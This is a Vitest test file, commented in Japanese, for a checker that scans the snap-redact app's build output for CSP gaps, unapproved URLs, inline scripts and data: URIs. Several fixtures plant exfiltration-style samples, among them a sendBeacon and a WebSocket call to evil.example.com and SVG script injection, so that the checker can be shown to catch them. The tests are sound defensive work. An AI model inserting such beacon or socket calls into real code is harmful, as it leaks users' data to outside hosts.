// @vitest-environment node
// check-dist.mjs 自体のテスト（docs/06-test-design.md 3章）
// わざと問題を入れた小さな dist もどきで、検査が失敗することを確かめる。
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { checkDist } from './check-dist.mjs';

const GOOD_HEADERS = [
  '/snap-redact/*',
  "  Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'none'; frame-ancestors 'none'",
  '',
].join('\n');
const GOOD_HTML =
  '<!doctype html><html><head><script type="module" src="/snap-redact/assets/index.js"></script></head><body></body></html>';

/** @type {string} */
let dist;

/**
 * @param {string} path
 * @param {string} content
 */
function put(path, content) {
  const full = join(dist, path);
  mkdirSync(join(full, '..'), { recursive: true });
  writeFileSync(full, content);
}

function makeGoodDist() {
  put('_headers', GOOD_HEADERS);
  put('snap-redact/index.html', GOOD_HTML);
  put(
    'snap-redact/assets/index.js',
    'const ns="http://www.w3.org/2000/svg";const e="https://react.dev/errors/1";',
  );
  put('snap-redact/assets/index.css', 'body{color:red}');
  put('snap-redact/third-party-licenses/index.html', '<!doctype html><title>OSS</title>');
}

beforeEach(() => {
  dist = mkdtempSync(join(tmpdir(), 'check-dist-'));
});
afterEach(() => {
  rmSync(dist, { recursive: true, force: true });
});

describe('checkDist', () => {
  it('問題のない成果物は合格する', () => {
    makeGoodDist();
    expect(checkDist(dist)).toEqual([]);
  });

  it('_headers がないと失敗する', () => {
    makeGoodDist();
    rmSync(join(dist, '_headers'));
    expect(checkDist(dist).join()).toMatch(/_headers がありません/);
  });

  it("CSP に connect-src 'none' がないと失敗する", () => {
    makeGoodDist();
    put('_headers', "/snap-redact/*\n  Content-Security-Policy: default-src 'self'\n");
    expect(checkDist(dist).join()).toMatch(/connect-src 'none'/);
  });

  it("connect-src 'none' が別のパスにしかない場合も失敗する", () => {
    makeGoodDist();
    put('_headers', "/other/*\n  Content-Security-Policy: connect-src 'none'\n");
    expect(checkDist(dist).join()).toMatch(/connect-src 'none'/);
  });

  it('snap-redact/index.html がないと失敗する（出力先の設定漏れ）', () => {
    makeGoodDist();
    rmSync(join(dist, 'snap-redact', 'index.html'));
    expect(checkDist(dist).join()).toMatch(/index\.html がありません/);
  });

  it('第三者のライセンスの一覧がないと失敗する', () => {
    makeGoodDist();
    rmSync(join(dist, 'snap-redact', 'third-party-licenses'), { recursive: true });
    expect(checkDist(dist).join()).toMatch(/third-party-licenses/);
  });

  it('JS に許可していない URL があると失敗する', () => {
    makeGoodDist();
    put('snap-redact/assets/evil.js', 'navigator.sendBeacon("https://evil.example.com/collect")');
    expect(checkDist(dist).join()).toMatch(/許可していない URL https:\/\/evil\.example\.com/);
  });

  it('CSS に外部のフォント URL があると失敗する', () => {
    makeGoodDist();
    put('snap-redact/assets/index.css', '@import url(https://fonts.example.com/css);');
    expect(checkDist(dist).join()).toMatch(/fonts\.example\.com/);
  });

  it('許可した URL（フッターのリンク）は合格する', () => {
    makeGoodDist();
    put(
      'snap-redact/assets/footer.js',
      'const a="https://circle-note.com/mask-unmask/";const b="https://github.com/digi-garden/snap-redact";',
    );
    expect(checkDist(dist)).toEqual([]);
  });

  it('digi-garden.com はトップ・利用規約・プライバシーポリシーだけ許可する', () => {
    makeGoodDist();
    put(
      'snap-redact/assets/footer.js',
      'const a="https://digi-garden.com/";const b="https://digi-garden.com/terms/";const c="https://digi-garden.com/privacy/";',
    );
    expect(checkDist(dist)).toEqual([]);
    put('snap-redact/assets/x.js', 'const a="https://digi-garden.com/collect?x=1";');
    expect(checkDist(dist).join()).toMatch(/digi-garden\.com\/collect/);
  });

  it('似た名前のドメインは許可しない', () => {
    makeGoodDist();
    put('snap-redact/assets/x.js', 'const a="https://circle-note.com.evil.example/";');
    expect(checkDist(dist).join()).toMatch(/circle-note\.com\.evil/);
  });

  it('HTML にインラインの <script> があると失敗する', () => {
    makeGoodDist();
    put('snap-redact/index.html', GOOD_HTML.replace('</body>', '<script>alert(1)</script></body>'));
    expect(checkDist(dist).join()).toMatch(/インラインの <script>/);
  });

  it('HTML にインラインの <style> があると失敗する', () => {
    makeGoodDist();
    put('snap-redact/index.html', GOOD_HTML.replace('</head>', '<style>body{}</style></head>'));
    expect(checkDist(dist).join()).toMatch(/インラインの <style>/);
  });

  it('CSS に data: URI があると失敗する', () => {
    makeGoodDist();
    put('snap-redact/assets/index.css', '.a{background:url("data:image/svg+xml,abc")}');
    expect(checkDist(dist).join()).toMatch(/data: URI/);
  });

  it('HTML に data: URI があると失敗する', () => {
    makeGoodDist();
    put(
      'snap-redact/index.html',
      GOOD_HTML.replace('</head>', '<link rel="icon" href="data:image/png;base64,AA"></head>'),
    );
    expect(checkDist(dist).join()).toMatch(/data: URI/);
  });

  it('WebSocket の URL があると失敗する', () => {
    makeGoodDist();
    put('snap-redact/assets/ws.js', 'new WebSocket("wss://evil.example.com/socket")');
    expect(checkDist(dist).join()).toMatch(/wss:\/\/evil\.example\.com/);
  });

  it('react.dev のエラー URL に余計なパスが続く場合は許可しない', () => {
    makeGoodDist();
    put('snap-redact/assets/x.js', 'const a="https://react.dev/errors/1/../../evil";');
    expect(checkDist(dist).join()).toMatch(/許可していない URL https:\/\/react\.dev/);
  });

  it('SVG に <script> があると失敗する', () => {
    makeGoodDist();
    put(
      'snap-redact/favicon.svg',
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    );
    expect(checkDist(dist).join()).toMatch(/SVG に <script>/);
  });

  it('SVG に外部の URL があると失敗する', () => {
    makeGoodDist();
    put(
      'snap-redact/favicon.svg',
      '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example.com/a.png"/></svg>',
    );
    expect(checkDist(dist).join()).toMatch(/evil\.example\.com/);
  });

  it('名前空間だけの SVG は合格する', () => {
    makeGoodDist();
    put('snap-redact/favicon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><circle r="1"/></svg>');
    expect(checkDist(dist)).toEqual([]);
  });

  it('ソースマップ（.map）は検査の対象外', () => {
    makeGoodDist();
    put('snap-redact/assets/index.js.map', '{"sourcesContent":["// see https://example.com"]}');
    expect(checkDist(dist)).toEqual([]);
  });
});
